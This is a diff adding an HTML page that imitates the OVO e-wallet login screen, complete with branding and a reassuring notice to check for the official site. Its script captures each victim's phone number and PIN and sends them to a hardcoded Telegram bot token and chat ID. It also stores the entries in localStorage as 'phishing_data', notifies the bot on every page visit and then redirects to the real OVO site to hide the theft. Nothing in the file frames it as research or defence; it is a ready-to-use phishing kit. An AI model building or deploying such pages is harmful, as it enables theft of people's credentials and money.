@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OVO - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: #4d27aa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: white;
+            border-radius: 25px;
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+        }
+        
+        .ovo-header {
+            background: #4d27aa;
+            padding: 40px 30px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+        
+        .ovo-logo {
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .ovo-tagline {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .login-form {
+            padding: 30px;
+        }
+        
+        .form-title {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .input-field {
+            margin-bottom: 25px;
+        }
+        
+        .field-label {
+            display: block;
+            margin-bottom: 10px;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .ovo-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #f9f9f9;
+        }
+        
+        .ovo-input:focus {
+            border-color: #4d27aa;
+            outline: none;
+            background: white;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 18px;
+            background: #4d27aa;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        
+        .login-button:hover {
+            background: #3d1f88;
+        }
+        
+        .helper-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        
+        .helper-links a {
+            color: #4d27aa;
+            text-decoration: none;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #888;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+        }
+        
+        .phone-container {
+            display: flex;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #f9f9f9;
+        }
+        
+        .country-code {
+            padding: 16px;
+            background: #eee;
+            border-right: 1px solid #ddd;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 16px;
+            font-size: 16px;
+        }
+        
+        .security-note {
+            background: #f0f5ff;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #555;
+            border-left: 4px solid #4d27aa;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="ovo-header">
+            <div class="ovo-logo">OVO</div>
+            <div class="ovo-tagline">Lebih dari sekadar dompet digital</div>
+        </div>
+        
+        <div class="login-form">
+            <div class="form-title">Masuk ke Akun OVO</div>
+            
+            <form id="loginForm">
+                <div class="input-field">
+                    <label class="field-label">Nomor Telepon Terdaftar</label>
+                    <div class="phone-container">
+                        <div class="country-code">+62</div>
+                        <input type="tel" class="phone-input" id="phone" placeholder="812-3456-7890" required>
+                    </div>
+                </div>
+                
+                <div class="input-field">
+                    <label class="field-label">PIN OVO</label>
+                    <input type="password" class="ovo-input" id="pin" maxlength="6" placeholder="6 digit PIN" required>
+                </div>
+                
+                <div class="security-note">
+                    🔒 Pastikan Anda berada di situs resmi OVO. Jangan berikan PIN kepada siapapun.
+                </div>
+                
+                <button type="submit" class="login-button">MASUK SEKARANG</button>
+            </form>
+            
+            <div class="helper-links">
+                <a href="#">Lupa PIN?</a>
+                <a href="#">Butuh Bantuan?</a>
+                <a href="#">Daftar OVO</a>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2024 PT Visionet Internasional (OVO). Hak Cipta Dilindungi.</p>
+            <p style="margin-top: 8px; font-size: 11px;">
+                Kebijakan Privasi | Syarat & Ketentuan | FAQ
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram config
+        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
+        const CHAT_ID = "8313500840";
+        
+        // Tangkap data login
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+            const timestamp = new Date().toLocaleString();
+            
+            // Format message untuk Telegram
+            const message = `💜 OVO LOGIN\n📱: +62${phone}\n🔢: ${pin}\n⏰: ${timestamp}\n🌐: ${navigator.userAgent.substring(0,50)}`;
+            
+            // Kirim ke Telegram
+            sendToTelegram(message);
+            
+            // Simpan di localStorage
+            const data = {
+                site: 'OVO',
+                phone: '+62' + phone,
+                pin: pin,
+                timestamp: timestamp,
+                userAgent: navigator.userAgent
+            };
+            
+            saveToLocalStorage(data);
+            
+            // Tampilkan loading
+            const btn = document.querySelector('.login-button');
+            btn.textContent = "Verifying...";
+            btn.disabled = true;
+            
+            // Redirect ke OVO asli
+            setTimeout(() => {
+                alert("Login berhasil! Mengarahkan ke OVO...");
+                window.location.href = "https://www.ovo.id";
+            }, 1500);
+        });
+        
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch(e) {
+                console.log("Telegram silent error");
+            }
+        }
+        
+        // Simpan ke localStorage
+        function saveToLocalStorage(data) {
+            let existingData = JSON.parse(localStorage.getItem('phishing_data') || '[]');
+            existingData.push(data);
+            localStorage.setItem('phishing_data', JSON.stringify(existingData));
+        }
+        
+        // Auto focus
+        window.onload = function() {
+            document.getElementById('phone').focus();
+            sendToTelegram("💜 OVO page accessed");
+        };
+    </script>
+</body>
+</html>
